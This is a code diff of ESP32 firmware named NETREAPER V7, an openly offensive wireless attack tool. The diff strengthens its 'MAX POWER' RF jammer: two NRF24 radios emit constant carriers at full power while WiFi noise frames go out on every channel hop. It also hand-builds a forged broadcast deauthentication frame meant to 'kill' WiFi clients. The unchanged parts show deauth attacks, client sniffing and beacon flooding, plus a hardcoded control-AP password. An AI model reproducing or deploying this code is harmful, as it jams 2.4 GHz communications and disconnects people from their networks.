@@ -1,11 +1,16 @@
 /*
- * NETREAPER V7 — OLED + 3-Mode + No WebServer
- * Modes: RF Jam / Deauth / Beacon
+ * NETREAPER V7 — OLED + 3-Mode + MAX POWER JAM v2
  * GPIO4=Right/Scroll  GPIO5=Left/Select
  * OLED: SDA=25 SCL=26 VCC=3.3V GND=GND (0x3C)
  * LED: RF=GPIO2  Deauth=GPIO32
  * NRF24: HSPI(CE=27,CSN=15) VSPI(CE=22,CSN=21)
- * lib_deps: nrf24/RF24@^1.4.9, adafruit/Adafruit SSD1306@^2.5.7
+ *
+ * MAX POWER RF JAM v2:
+ *   - Both NRF24 radios SYNCED same channel (2x power per freq)
+ *   - ESP32 WiFi AP_STA = noise on BOTH interfaces (2x WiFi interference)
+ *   - 3 noise packets (128 bytes each) per channel hop
+ *   - Broadcast fake deauth frame per hop (kills WiFi clients)
+ *   - Total: 2x NRF24 carrier + 6x WiFi noise + 1x deauth per hop
  */
 #include <SPI.h>
 #include <RF24.h>
@@ -38,6 +43,9 @@ RF24 radio(27,15,16000000);
 RF24 radio1(22,21,16000000);
 int ch=45, ch1=45;
 
+uint8_t noisePkt[128];
+uint8_t bcastDeauth[26];
+
 struct WiFiNetwork{String ssid; uint8_t bssid[6]; int channel; int rssi; int encType;};
 int networkCount=0, targetChannel=1;
 uint8_t targetBSSID[6];
@@ -52,6 +60,9 @@ struct SniffedClient{uint8_t bssid[6]; uint8_t client[6];};
 SniffedClient globalSniffedClients[50];
 int globalSniffedCount=0;
 String targetSSID="";
+
+const char* apSSID="NetReaper_Control";
+const char* apPassword="admin12345";
 
 // Forward decls
 void checkButtons(); void handleScroll(); void handleSelect(); void stopCurrentMode();
@@ -112,10 +123,10 @@ void updateDisplay(){
     case STATE_RF_JAM:
       display.println(">> RF JAM <<");
       display.println("");
-      display.println("MAX POWER ACTIVE");
-      display.print("Ch1:"); display.println(ch);
-      display.print("Ch2:"); display.println(ch1);
-      display.println("WiFi+BT OFF");
+      display.println("MAX POWER v2");
+      display.println("2xNRF synced");
+      display.println("WiFi AP+STA");
+      display.println("+ deauth flood");
       display.println("");
       display.println("Press=STOP");
       break;
@@ -182,13 +193,12 @@ void updateDisplay(){
 
 void updateLEDs(){
   static unsigned long lb=0; static bool bs=false;
-  bool active=(appState==STATE_RF_JAM||appState==STATE_DEAUTH_ATTACK||appState==STATE_BEACON);
+  bool active=(appState==STATE_DEAUTH_ATTACK||appState==STATE_BEACON);
   if(active&&millis()-lb>200){
     bs=!bs; lb=millis();
-    if(appState==STATE_RF_JAM)digitalWrite(rfLedPin,bs?HIGH:LOW);
-    if(appState==STATE_DEAUTH_ATTACK||appState==STATE_BEACON)digitalWrite(deauthLedPin,bs?HIGH:LOW);
+    digitalWrite(deauthLedPin,bs?HIGH:LOW);
   }
-  if(!active){digitalWrite(rfLedPin,LOW); digitalWrite(deauthLedPin,LOW);}
+  if(!active){digitalWrite(deauthLedPin,LOW);}
 }
 
 // ============ BUTTON HANDLERS ============
@@ -241,36 +251,63 @@ void checkButtons(){
   l4=b4; l5=b5;
 }
 
-// ============ RF JAM (V7 unchanged) ============
+// ============ MAX POWER RF JAM v2 ============
 void startJamming(){
-  Serial.println("\n>>> MAX POWER BT/WIFI JAMMER ON");
+  Serial.println("\n>>> MAX POWER RF JAM v2 ON (multi-source)");
   digitalWrite(rfLedPin,HIGH);
-  WiFi.mode(WIFI_OFF); delay(100);
-  esp_wifi_stop();
   btStop(); delay(50);
+  // AP_STA mode = both WiFi interfaces up for noise broadcast
+  WiFi.mode(WIFI_AP_STA);
+  esp_wifi_set_max_tx_power(84);
+  esp_wifi_set_ps(WIFI_PS_NONE);
+  esp_wifi_set_protocol(WIFI_IF_AP,WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
+  esp_wifi_set_protocol(WIFI_IF_STA,WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
+  // Pre-init broadcast deauth packet (reason 7 = Class 3 frame from non-associated STA)
+  bcastDeauth[0]=0xC0; bcastDeauth[1]=0; bcastDeauth[2]=0x3A; bcastDeauth[3]=1;
+  memset(&bcastDeauth[4],0xFF,6);  // dst = broadcast
+  memset(&bcastDeauth[10],0xFF,6); // src = broadcast
+  memset(&bcastDeauth[16],0xFF,6); // bssid = broadcast
+  bcastDeauth[22]=0; bcastDeauth[23]=0;
+  bcastDeauth[24]=7; bcastDeauth[25]=0;  // reason 7
+  // Pre-fill noise packet
+  for(int i=0;i<128;i++)noisePkt[i]=esp_random()%256;
+  // Both NRF24 radios at PA_MAX const carrier
   radio.powerUp(); radio1.powerUp(); initRF24Configs();
   radio.startConstCarrier(RF24_PA_MAX,ch);
   radio1.startConstCarrier(RF24_PA_MAX,ch1);
 }
 void aggressiveRandomMode(){
-  uint8_t randCh1=random(2,80);
+  // Both radios SYNCED on same channel (2x power per frequency)
   uint8_t randCh=random(2,80);
-  radio1.setChannel(randCh1);
+  radio1.setChannel(randCh);
   radio.setChannel(randCh);
+  // Refresh random bytes for noise packets (varied each hop)
+  for(int i=4;i<128;i++)noisePkt[i]=esp_random()%256;
+  // 3x noise broadcasts on AP interface (128 bytes each)
+  esp_wifi_80211_tx(WIFI_IF_AP,noisePkt,128,false);
+  esp_wifi_80211_tx(WIFI_IF_AP,noisePkt,128,false);
+  esp_wifi_80211_tx(WIFI_IF_AP,noisePkt,128,false);
+  // 3x noise broadcasts on STA interface (double WiFi interference)
+  esp_wifi_80211_tx(WIFI_IF_STA,noisePkt,128,false);
+  esp_wifi_80211_tx(WIFI_IF_STA,noisePkt,128,false);
+  esp_wifi_80211_tx(WIFI_IF_STA,noisePkt,128,false);
+  // 1x broadcast deauth frame (kills WiFi clients on this channel)
+  esp_wifi_80211_tx(WIFI_IF_AP,bcastDeauth,26,false);
+  esp_wifi_80211_tx(WIFI_IF_STA,bcastDeauth,26,false);
 }
 void stopJamming(){
-  Serial.println("\n>>> RF JAMMER OFF");
+  Serial.println("\n>>> RF JAM OFF");
   digitalWrite(rfLedPin,LOW);
   radio.powerDown(); radio1.powerDown(); delay(750);
-  WiFi.mode(WIFI_OFF); delay(200);
   WiFi.mode(WIFI_AP); delay(150);
+  WiFi.softAP(apSSID,apPassword,1,0,4); delay(150);
   esp_wifi_set_protocol(WIFI_IF_AP,WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
   esp_wifi_set_max_tx_power(84);
   esp_wifi_set_ps(WIFI_PS_NONE);
   Serial.println("WiFi Re-enabled.");
 }
 
-// ============ SNIFFER (V7 unchanged) ============
+// ============ SNIFFER ============
 void snifferCallback(void*buf,wifi_promiscuous_pkt_type_t type){
   if(type!=WIFI_PKT_MGMT&&type!=WIFI_PKT_DATA)return;
   uint8_t*p=((wifi_promiscuous_pkt_t*)buf)->payload;
@@ -301,7 +338,7 @@ void snifferCallback(void*buf,wifi_promiscuous_pkt_type_t type){
   }
 }
 
-// ============ WIFI SCAN (V7 - no web HTML) ============
+// ============ WIFI SCAN ============
 void startWiFiScan(){
   Serial.println("[*] Scanning...");
   WiFi.mode(WIFI_AP_STA); WiFi.disconnect(true); delay(100);
@@ -324,7 +361,7 @@ void startWiFiScan(){
   Serial.printf("[*] Done: %d networks\n",networkCount);
 }
 
-// ============ DEAUTH (V7 unchanged) ============
+// ============ DEAUTH ============
 void startDeauth(int index){
   if(index<0||index>=networkCount)return;
   memcpy(targetBSSID,scannedNetworks[index].bssid,6);
@@ -469,7 +506,7 @@ void sendPowerfulDeauth(){
   sendCSABeaconFlood();
 }
 
-// ============ BEACON (V7 unchanged) ============
+// ============ BEACON ============
 void startBeaconFlood(){
   if(isJamming){isJamming=false; stopJamming();}
   if(isDeauthing)stopDeauth();
@@ -519,23 +556,33 @@ void setup(){
   appState=STATE_MENU; updateDisplay();
   esp_wifi_set_max_tx_power(84); initHP(); initSP();
   WiFi.mode(WIFI_AP);
-  Serial.println("[*] V7 Ready - OLED + 3 Mode");
+  WiFi.softAP(apSSID, apPassword, 1, 0, 4);
+  Serial.println("[*] V7 Ready - MAX POWER v2");
 }
 
 void loop(){
   checkButtons();
-  if(appState!=STATE_RF_JAM) updateLEDs();
-  switch(appState){
-    case STATE_RF_JAM:
-  for(int i=0;i<50;i++) aggressiveRandomMode();
-  break;
-    case STATE_DEAUTH_ATTACK: sendPowerfulDeauth(); delay(1); yield(); break;
-    case STATE_BEACON:
-      esp_wifi_set_channel(currentBeaconChannel,WIFI_SECOND_CHAN_NONE);
-      for(int i=0;i<30;i++)sendBeacon(currentBeaconChannel);
-      currentBeaconChannel++; if(currentBeaconChannel>13)currentBeaconChannel=1; yield(); break;
-    default: break;
+  
+  if(isBeaconing){
+    updateLEDs();
+    esp_wifi_set_channel(currentBeaconChannel,WIFI_SECOND_CHAN_NONE);
+    for(int i=0;i<30;i++)sendBeacon(currentBeaconChannel);
+    currentBeaconChannel++; if(currentBeaconChannel>13)currentBeaconChannel=1; yield();
   }
+  else if(isJamming){
+    checkButtons();
+    aggressiveRandomMode();
+  }
+  else {
+    updateLEDs();
+    if(isDeauthing){
+      sendPowerfulDeauth(); delay(1); yield();
+    }
+  }
+  
   static unsigned long lastDisp=0;
-  if(millis()-lastDisp>200){updateDisplay(); lastDisp=millis();}
+  if(appState!=STATE_RF_JAM && millis()-lastDisp>200){
+    updateDisplay();
+    lastDisp=millis();
+  }
 }
